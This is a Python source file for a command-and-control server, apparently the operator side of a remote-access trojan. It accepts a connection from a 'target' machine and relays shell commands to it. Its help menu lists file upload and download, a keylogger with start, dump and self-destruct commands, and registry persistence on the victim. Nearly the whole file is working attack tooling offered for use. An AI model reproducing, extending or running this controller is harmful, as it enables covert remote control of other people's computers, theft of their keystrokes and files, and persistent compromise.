import socket
from termcolor import colored
import pyfiglet
import json
import os

def recv_data():
	data = ''
	while True:
		try:
			data = data + target.recv(1024).decode().rstrip()
			return json.loads(data)
		except ValueError:
			continue

def send_data(data):
	jsondata = json.dumps(data) # serializing the data so as to send reliably.
	target.send(jsondata.encode()) # encoding the serialized data & sending it to the target.

def target_communication():
	while True:
		command = input(f"* Shell~{ip}: ").lower()
		send_data(command)
		if command == "quit":
			break
		elif command == 'clear':
			os.system('clear')
		elif command[:3] == "cd ":
			pass
		elif command == "help":
			            print(colored('''\n
            quit                                --> Quit Session With The Target
            clear                               --> Clear The Screen
            cd *Directory Name*                 --> Changes Directory On Target System
            upload *file name*                  --> Upload File To The target Machine
            download *file name*                --> Download File From Target Machine
            keylog_start                        --> Start The Keylogger
            keylog_dump                         --> Print Keystrokes That The Target Inputted
            keylog_stop                         --> Stop And Self Destruct Keylogger File
            persistence *RegName* *fileName*    --> Create Persistence In Registry''','yellow'))
		else:
			result = recv_data()
			print(f"\n {result}")


if __name__ == "__main__":

	ascii_banner = colored(pyfiglet.figlet_format(f"C2 Server\n"),"magenta")
	print(ascii_banner)

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind(("127.0.0.1", 5555))
	print(colored("[+] Listening  for Incomig Connections.", "yellow"))
	sock.listen(5)

	target, ip = sock.accept()
	print(colored(f"[+] Target connected from {ip}","green"))

	target_communication()
